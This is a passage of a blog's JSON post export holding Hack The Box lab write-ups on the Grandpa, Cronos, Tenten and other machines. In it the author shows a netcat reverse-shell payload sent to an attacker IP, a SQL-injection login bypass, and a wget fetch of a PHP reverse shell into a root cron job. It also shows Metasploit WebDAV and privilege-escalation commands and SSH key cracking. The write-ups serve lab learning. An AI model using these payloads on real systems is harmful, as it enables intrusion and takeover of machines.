/>\n# whoami<br />\nroot<br />\n# id<br />\nuid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)<br />\n#</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200117-162800.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200117-162800.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200117-162855.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200117-162855.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>Complete finally!</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.157",
      "title": "Wall User and Root flag [Hack the box] - [Blog]  ",
      "published": {
        "seconds": 1579274985,
        "nanoseconds": 564000000
      },
      
      "author": "XsiSec none"
    },
    "GIUFwzDViT3FPlGYdKDT": {
      "author": "XsiSec",
      
      "image": "https://firebasestorage.googleapis.com/v0/b/xsisec-com.appspot.com/o/posts%2FKali%20Linux%20HTB%20-%20VMware%20Workstation_005.png?alt=media&token=b2937132-1506-4bd0-8ec4-d22ad84d6be7",
      "content": "<div>I just learned a easy way of re-use of a post-request made within burp.</div><div>save it as \"*.req\".</div><div>then use it for instance in sqlmap</div><div><br></div><div>sqlmap -r /home/xsisec/Desktop/HTB/Popcorn/login.req --level 5 --risk 3</div><div><br></div><div><br></div><div>another cool thing I done before but got more understanding of its to</div><div>fake a php request as image request.</div><div><br></div><div>You remake the structure of the request while listening:</div><div><br></div><div>find a image make it to base-64 string then take pieces of the string and use it within your new request:</div><div>content type: image/png</div><div><br></div><div>xxxxxxxxxxxx</div><div><br></div><div>to verify the string in kali-linux pretty simple</div><div><br></div><div>xsisec@d0m:~$ echo xxxxxx |base64 -d &gt;file</div><div><div>xsisec@d0m:~$ file file</div><div>file: PNG image data, 1500 x 421, 8-bit/color RGBA, non-interlaced</div></div><div><br></div><div><br></div><div><br></div><div><br></div><div><br></div>",
      "title": "Made some progress in the \"Popcorn day 1 [Hack the box]  ",
      "published": {
        "seconds": 1554227048,
        "nanoseconds": 180000000
      }
    },
    "HEMD1RH5F6W1TfU2Uj4a": {
      "content": "<p>Finally I made the box Granda,</p>\n\n<p>&nbsp;</p>\n\n<p>I started up with a nmap scan as usual</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-095047.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-095047.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>Its running <em>Microsoft IIS httpd 6.0</em></p>\n\n<p>then I made an additonal port scan unfortunately it gave me nothing more.</p>\n\n<p>so I started up in the background with <em>Dirb</em> and N<em>ikto</em></p>\n\n<p>when I started the box I I had in my mind I thought its might similar to the box <em>Granny.</em></p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-095438.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-095438.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p>The scan with Nikto was more successfully =)</p>\n\n<p>I had a lots of different&nbsp; HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</p>\n\n<p>I might could take advantage to use.</p>\n\n<p>&nbsp;</p>\n\n<p>I had in my mind to generate different shells with msfvenom</p>\n\n<p><em>MsfVenom is a Metasploit standalone payload generator as a replacement for msfpayload and msfencode.</em></p>\n\n<p>&nbsp;</p>\n\n<p>I started to use a tool called webdav its a simple python scripts that let you post content on the server. though no success. so I googled and I found a really good source:</p>\n\n<p><a href=\"https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/\" target=\"_blank\">https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/</a></p>\n\n<p>&nbsp;</p>\n\n<p>there was two ways of do it, either with curl or metasploit:</p>\n\n<p>With Curl command:</p>\n\n<p><em>curl //192.168.1.103/dav/ --upload-file /root/Desktop/curl.php -v</em></p>\n\n<p>The curl command was really a disaster the feedback gave me the internal error 500 though I could navigate to my file.</p>\n\n<p>&nbsp;</p>\n\n<p><em>msf&gt; use auxiliary/scanner/http/http_put</em></p>\n\n<p><em>msf&gt;auxiliary (http_put) &gt; set rhosts 192.168.1.103</em></p>\n\n<p><em>msf&gt;auxiliary (http_put) &gt; set payload php/meterpreter/reverse_tcp</em></p>\n\n<p><em>msf&gt;auxiliary (http_put) &gt; set path /dav/</em></p>\n\n<p><em>msf&gt;auxiliary (http_put) &gt; set filename meter.php</em></p>\n\n<p><em>msf&gt;auxiliary (http_put) &gt; set filedata file://root/Desktop/meter.php</em></p>\n\n<p><em>msf&gt;auxiliary (http_put) &gt; exploit</em></p>\n\n<p>I felt metasploit simplefied it a lots to me I also got in return the destination where it posts.</p>\n\n<p>Though I was not able to execute the shells I got simple error in the browser such &quot;parameters input=&#39;&#39; &quot;.</p>\n\n<p>&nbsp;</p>\n\n<p>Since I know it was a windows box&nbsp; I made a simple search in searchsploit &quot;searchsploit IIS 6.0&quot;</p>\n\n<p>I found several exploits.</p>\n\n<p>There are a variety of different vulnerabilities, and a number referencing WebDAV. Looking back at nmap we see that http-webdav is indeed enabled so it seems likely that one of these will indeed work.<br />\nSince it&rsquo;s a windows machine, I&rsquo;m in favour of making my life as easy as possible, so the first thing I do is look to see if there are metasploit module available.<br />\nMetasploit is a toolkit for exploitation which includes exploits for infiltration and exploitation, so if it&rsquo;s available it makes the job of rooting a lot of these boxes much easier (some would say too easy).</p>\n\n<p>though when I run the command msfconsole -q I faced issues</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-115235.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-115235.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>In this we see a few, but based on the date and description, the best matching appears to be <em>&quot;exploit/windows/iis/iis_webdav_scstoragepathfromurl&quot; </em>especially when we view&nbsp;the description.<br />\nThis shows it targets Windows Server 2003 R2, which is a possibility for the OS if we look back at the nmap scan, and a rather high up one. So in this case it doesn&rsquo;t look like it will hurt at all to give this exploit a try.</p>\n\n<p>I used following exploit:</p>\n\n<p><em>exploit/windows/iis/iis_webdav_scstoragepathfromurl</em></p>\n\n<p><a href=\"https://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-105430.png\" target=\"_blank\"><img alt=\"\" src=\"https://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-105430.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>though could not run <strong>getuid</strong></p>\n\n<p>so I run the session in background started up with as usual</p>\n\n<p>multi/recon/local_exploit_suggester&gt; session 1</p>\n\n<p>I found few exploits I could use:</p>\n\n<p><a href=\"https://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-105645.png\" target=\"_blank\"><img alt=\"\" src=\"https://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-105645.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p>though none of the above listed exploits wasn&#39;t successfully.</p>\n\n<p>I read a bit of how people did.</p>\n\n<p>I ended up with&nbsp; <em>&quot;post/windows/migrate module&quot;</em></p>\n\n<p><em>msf post(migrate) &gt; set SESSION 1<br />\nSESSION =&gt; 1<br />\nmsf post(migrate) &gt; exploit<br />\n[*] Running module against GRANNY<br />\n[*] Current server process: rundll32.exe (2540)<br />\n[*] Spawning notepad.exe process to migrate to<br />\n[+] Migrating to 3072<br />\n[+] Successfully migrated to process 3072<br />\n[*] Post module execution completed<br />\nmsf post(migrate) &gt; sessions 2<br />\n[*] Starting interaction with 2...</em></p>\n\n<p><em>meterpreter &gt; getuid<br />\nServer username: NT AUTHORITY\\NETWORK SERVICE</em></p>\n\n<p>I could get the user flag</p>\n\n<p><a href=\"https://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-112737.png\" target=\"_blank\"><img alt=\"\" src=\"https://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-112737.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>though not the Adminstrator flag.</p>\n\n<p>I run the current session in background again.<br />\n[*] 10.10.10.14 - Collecting local exploits for x86/windows...<br />\n[*] 10.10.10.14 - 36 exploit checks are being tried...<br />\n[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.<br />\n[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.<br />\n[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.<br />\n[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.<br />\n[+] 10.10.10.14 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.<br />\n[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.<br />\n[*] Post module execution completed</p>\n\n<p>&nbsp;</p>\n\n<p>I ended up with&nbsp; <strong>&quot;exploit/windows/local/ms14_070_tcpip_ioctl&quot;.</strong></p>\n\n<p><a href=\"https://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-110650.png\" target=\"_blank\"><img alt=\"\" src=\"https://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-110650.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>Suddendly I got admin priveleges.</p>\n\n<p>Something I will definitely use the procedure futher one.</p>\n\n<ol>\n\t<li>once I got shell.</li>\n\t<li>local exploit suggester</li>\n\t<li>(if no vulnr exploit is working) try to migrate.</li>\n\t<li>then re-run exploit suggester.</li>\n\t<li>&nbsp;</li>\n</ol>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.14",
      "title": "Grandpa - Completed [Hack the box]",
      "published": {
        "seconds": 1558598869,
        "nanoseconds": 857000000
      },
      
      "author": "XsiSec",
      "levels": [
        "Medium"
      ],
      "image": null,
      "os": [
        "Windows"
      ]
    },
    "HRRto5J4z7rH1ULAlGMe": {
      "content": "<div>This was definitely the most difficult box so far to break in into.</div><div><br></div><div>I should say I divide the box in two big steps first 'user' and then 'root'.</div><div><br></div><div>I first made a nmap scan:<br></div><div>nmap  -A\n10.10.10.13Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-28\n14:50 IST Nmap scan report for 10.10.10.13 Host is up (0.21s\nlatency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux;\nprotocol 2.0) | ssh-hostkey: | 2048\n18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA) | 256\n1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA) |_ 256\n1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (EdDSA) 53/tcp open\ndomain ISC BIND 9.10.3-P4-Ubuntu | dns-nsid: |_ bind.version:\n9.10.3-P4-Ubuntu 80/tcp open http Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2\nUbuntu Default Page: It works Service Info: OS: Linux; CPE:\ncpe:/o:linux:linux_kernel Service detection performed. Please report\nany incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP\naddress (1 host up) scanned in 34.17 seconds2.</div><div><br></div><div>I also made in the background another scan with dirb though no good outcome.</div><div><br></div><div>I also launched dnsrecon to find subdomains</div><div>recon -I\nfound <br></div><div>admin.cronos.htb</div><div>ns1.cronos.htbI <br></div><div><br></div><div>I added those into\n/etc/hosts</div><div><br></div><div>when I navigated to admin.cronos.htb</div><div>it was&nbsp; a very simple interface so I thought I could try out some sql injection.</div><div><br></div><div>\n\n\n\t\n\t\n\t\n\tp { margin-bottom: 0.25cm; line-height: 120%; }\n\n\n<p style=\"margin-bottom: 0cm; line-height: 100%\">I&nbsp; first listened to the browser with burp then saved the\nrequest as 'login.req',&nbsp; afterwards used <br></p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">sqlmap  -r login.req -u\n10.10.10.13</p><p style=\"margin-bottom: 0cm; line-height: 100%\">  though sqlmap didnt found anything I thought I could use.</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">so I gave some manually final atemps and found out:</p><p style=\"margin-bottom: 0cm; line-height: 100%\">\n\n\n\t\n\t\n\t\n\tp { margin-bottom: 0.25cm; line-height: 120%; }\n\n\n</p><p style=\"margin-bottom: 0cm; line-height: 100%\">username:admin'--\n-</p><p style=\"margin-bottom: 0cm; line-height: 100%\">password:anything</p><p style=\"margin-bottom: 0cm; line-height: 100%\">Succes&nbsp; ;=)</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">when I visited the page admin.cronos.htb</p><p style=\"margin-bottom: 0cm; line-height: 100%\">it was basically a text field that could take commands</p><p style=\"margin-bottom: 0cm; line-height: 100%\">so I started to experiment with first 'dir', 'whoami' etc.</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">I know I wanted to somehow spawn a 'bin/bash'.</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">I looked around on google and found from pentest a very poweful and useful cheatsheet I tampered the post-request and added <br></p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">command=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.14.2+1337+&gt;/tmp/f</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">finally I could run 'bash -i' (interactive terminal).</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">cd into 'C:/Users/noulis/user.txt'</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">first flag captured!<br></p>\n\n<p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">&nbsp;I was looking around few days of how I could privilege escalate&nbsp; to become root it was really hard but.</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">I found by navigate to /etc/ and 'cat crontab', several jobs that was running on server.</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">one interesting</p><p style=\"margin-bottom: 0cm; line-height: 100%\">php /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">when I made some research on the directories for the files and the directories that was used for the scheduled activities.I noticed after a while the the file for the job 'artisan' is not owned by root</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">so basically that means I could rewrite content to the file.</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">it became pretty simple I just spawned a simpleHTTPServer on my virtualhost, downloaded the reverse-shell-php file from pentestmonkey</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">then uploaded to the directory in cronos</p><p style=\"margin-bottom: 0cm; line-height: 100%\">wget http://10.10.14.2:8000/artisan</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">I just waited few mins to the server to run the job (every 5 mins)</p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\">&nbsp;wooala then I became root =).<br></p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p>\n\n<p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p><p style=\"margin-bottom: 0cm; line-height: 100%\"><br></p>\n\n</div><div><br>\n\n\n\n</div>",
      "title": " cronOS Complete [Hack the box]  ",
      "published": {
        "seconds": 1554907148,
        "nanoseconds": 946000000
      },
      "author": "XsiSec",
      
      "image": "https://firebasestorage.googleapis.com/v0/b/xsisec-com.appspot.com/o/posts%2FKali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_007.png?alt=media&token=70694236-4876-4e3d-99c4-5287a7f85718"
    },
    "IJ5aKFAdyVcRmobb6Spu": {
      
      "author": "XsiSec",
      "levels": [
        "Medium"
      ],
      "image": null,
      "os": [
        "Linux"
      ],
      "content": "<p>this was a little tricky box,</p>\n\n<p>I added 10.10.10.10 in the &#39;/etc/hosts&#39; as usual then navigated to the url:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_005.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_005.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>that made it more tricky now afterwards it feels sometimes *you forget the basics..<br />\nI forgot to try to navigate to &#39;10.10.10.10&#39; but then when i did voila =)</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_006.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_006.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>I started up with nmap scan&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_003.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_003.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I also scanned with dirbuster first with the following file-list:</p>\n\n<p><strong>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</strong>&nbsp;nothing special found:</p>\n\n<p>&nbsp;</p>\n\n<p>then I used another wordlist:</p>\n\n<p><strong>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</strong></p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_008.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_008.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>though it doesnt gave me that much information so I continue with a nikto scan</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_004.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_004.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>Voila its hopefully Wordpress somehow&nbsp;</p>\n\n<p><strong>&nbsp;&lt;http://10.10.10.10/index.php/wp-json/&gt;</strong></p>\n\n<p>to get futher I made few scans within wpscan and different parameters:</p>\n\n<p>wpscan --url 10.10.10.10</p>\n\n<p>wpscan --url 10.10.10.10 -enumerate u&nbsp;</p>\n\n<p>I started to look on the page and the content:</p>\n\n<p>since I have little experience of wordpress before I recognized on the posts the username &#39;<strong>takis</strong>&#39;, that could might help me later on.</p>\n\n<p>there was a lots of different lack in the wp setup</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_007.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_007.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I gave&nbsp;few exploits some atempts like:</p>\n\n<p>| [!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks&nbsp;</p>\n\n<p>&nbsp;| [!] Title: WordPress &lt;= 4.9.4 - Application Denial of Service (DoS) (unpatched)<br />\n&nbsp;</p>\n\n<p>though no success...</p>\n\n<p>To not waste any time I wanted to proceed so I instead checked little bit on the write-up and I found there is a plugin&nbsp;</p>\n\n<p>&nbsp;| [!] Title: Job Manager &lt;= 0.7.25 - &nbsp;Insecure Direct Object Reference</p>\n\n<p>though it was little bit tricky to get an understanding of the structure where the applied jobs is located so I cheated checked in the write-up:</p>\n\n<p>&nbsp;</p>\n\n<p>Basically its a user-form where people&nbsp; could apply&nbsp; a &#39;*apply CV form&#39;:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_010.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_010.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>I used burp to listen to the request then modified it and changed:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_009.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_009.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>replaced the the png image with a shell I found:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_011.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_011.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>the status code was <strong>200 OK!</strong></p>\n\n<p>since I know wordpress I guessed the upload place should be&nbsp;</p>\n\n<p>http://10.10.10.10./wp-content/uploads/</p>\n\n<p>though I couldn&#39;t figure out where so I checked again... on the write up</p>\n\n<p>I checked on @ippsec and I learned how do to a very effective curl request In first place I made them in a program called <strong>Postman,</strong> though then I followed his tutorial:</p>\n\n<p>this code snippet is something I really gonna use in different situations in future:</p>\n\n<p>&nbsp;for i in $(seq 1 20); do echo -n &quot;$i: &quot;; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep &#39;&lt;title&#39;; done</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_013.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_013.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>a very effecient way!</p>\n\n<p>then I found:</p>\n\n<p><strong>13: &lt;title&gt;Job Application: HackerAccessGranted &amp;#8211; Job Portal&lt;/title&gt;</strong><br />\n&nbsp;</p>\n\n<p>according top the job-manager plugin there was also an exploit:</p>\n\n<p><a href=\"http://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/\">https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/</a></p>\n\n<p>its basically few loops that iterates nested paths: I just modified it to find &#39;*jpg&#39; + 2013-2019</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_012.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_012.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>Amazing result =)</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_014.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_014.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>Got Dam!&nbsp;</p>\n\n<p><em>[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg</em></p>\n\n<p>&nbsp;</p>\n\n<p>I downloaded the image also run following program against it:</p>\n\n<p>strings&nbsp;HackerAccessGranted.jpg // no success :(</p>\n\n<p>binwalk&nbsp;&nbsp;HackerAccessGranted.jpg // no success :(</p>\n\n<p><br />\nI watched more on @ippsec</p>\n\n<p>He introduced a new tool I never used before called <strong>steghide</strong>, you can find zipped content in a image basically..</p>\n\n<p>steghide extract -sf HackerAccessGranted.jpg&nbsp;</p>\n\n<p>I found a id_rsa file&nbsp;</p>\n\n<p>I remeber from the box called @Brainfuck I made yesterday I used a tool called <strong>sshng2john&nbsp;</strong>then I run&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><strong>python &nbsp;sshng2john.py /home/xsisec/Desktop/HTB/Tentan/id_rsa &gt;decrypted.txt</strong></p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_015.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_015.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>it still encrypted so I run:</p>\n\n<p><strong>john decrypted.txt -w /usr/share/wordlists/rockyou.txt&nbsp;</strong></p>\n\n<p>I found the password superpassword</p>\n\n<p>so next thing was like in previusly box to run:</p>\n\n<p><strong>ssh -i id_rsa root@10.10.10.10</strong></p>\n\n<p>I also gave the password &#39;superuser&#39; though no success =(</p>\n\n<p>since I found earlier the username takis I tried:</p>\n\n<p><strong>ssh -i id_rsa takis@10.10.10.10&nbsp;</strong></p>\n\n<p>(and password)</p>\n\n<p><br />\nVoila =)</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_016.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali%20Linux%2064%20bit%20amd%20-%20VMware%20Workstation_016.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>I still was watching @ippsec he run the command afterwards:</p>\n\n<p><em>-l,&nbsp;--list</em></p>\n\n<p><em>If no&nbsp;command&nbsp;is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the&nbsp;-U&nbsp;option) on the current host. A longer list format is used if this option is specified multiple times and the security policy supports a verbose output format.</em></p>\n\n<p><em>If a&nbsp;command&nbsp;is specified and is permitted by the security policy, the fully-qualified path to the command is displayed along with any command line arguments. If&nbsp;command&nbsp;is specified but not allowed,&nbsp;sudo&nbsp;will exit with a status value of 1.</em></p>\n\n<p>we 